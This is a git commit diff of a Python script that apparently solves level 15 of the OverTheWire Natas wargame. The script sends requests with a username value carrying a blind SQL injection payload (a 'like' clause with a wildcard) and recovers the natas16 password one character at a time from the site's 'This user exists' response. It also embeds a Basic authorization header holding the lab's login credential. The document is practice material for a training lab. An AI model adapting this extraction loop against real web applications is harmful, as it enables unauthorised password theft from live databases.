f8aafa0c283df1b80a543b37c7f6d5b73418fc5a
matt.griffiths <matt.griffiths@gmail.com>
2016-11-10 01:54:13 -0500

    fixed loop and added while for length completion, it works!!!

--- Natas15_Request.py
+++ Natas15_Request.py
@@ -1,33 +1,38 @@
 import requests,string,re
 from bs4 import BeautifulSoup
-password = ("wA")
+password = ("")
 alphanum = string.ascii_letters + string.digits
 url = "http://natas15.natas.labs.overthewire.org/"
 #
-length = len(password)
 headers = {
     'authorization': "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==",
     'cache-control': "no-cache",
     'postman-token': "a485c7b5-2c71-52cf-fa16-62c92545ecf4"
     }
-for attempt in alphanum: 
-    querystring = {"debug":"yes","username":"natas16\" and password like \"" + attempt + "%"}
-    response = requests.request("GET", url, headers=headers, params=querystring)
-    c = response.text
-    soup = BeautifulSoup(c, "html.parser")
-    samples = soup.find_all(id='content')
-    print(samples)
-    strsample = str(samples)
-    if re.search("This user exists.",strsample):
-      for password in alphanum: 
-        querystring = {"debug":"yes","username":"natas16\" and password like \"" + password + "%"}
-        response = requests.request("GET", url, headers=headers, params=querystring)
-        c = response.text  
-        soup = BeautifulSoup(c, "html.parser")
-        samples = soup.find(id='content')
-        print(samples)
-        strsample = str(samples)
-        if re.search("This user exists.",strsample):
+while len(password) != 32:
+  for attempt in alphanum: 
+      querystring = {"debug":"yes","username":"natas16\" and password like \"" + password + attempt + "%"}
+      response = requests.request("GET", url, headers=headers, params=querystring)
+      c = response.text
+      soup = BeautifulSoup(c, "html.parser")
+      samples = soup.find_all(id='content')
+      print(samples)
+      strsample = str(samples)
+      if re.search("This user exists.",strsample):
+        password = password + attempt
+        #print("Good Value=" + password, len(password))
+        break
+print(password)      
+#      for attempt in alphanum: 
+ #       querystring = {"debug":"yes","username":"natas16\" and password like \"" + password + attempt + "%"}
+  #      response = requests.request("GET", url, headers=headers, params=querystring)
+   #     c = response.text  
+    #    soup = BeautifulSoup(c, "html.parser")
+    #    samples = soup.find(id='content')
+    ##    print(samples)
+    #    strsample = str(samples)
+    #    if re.search("This user exists.",strsample):
   #unfinished and untested so ignore
-          password.append()
-          print(password)
+   #       password1 = password + attempt
+    #      print("Good Value.." + password1)
+        
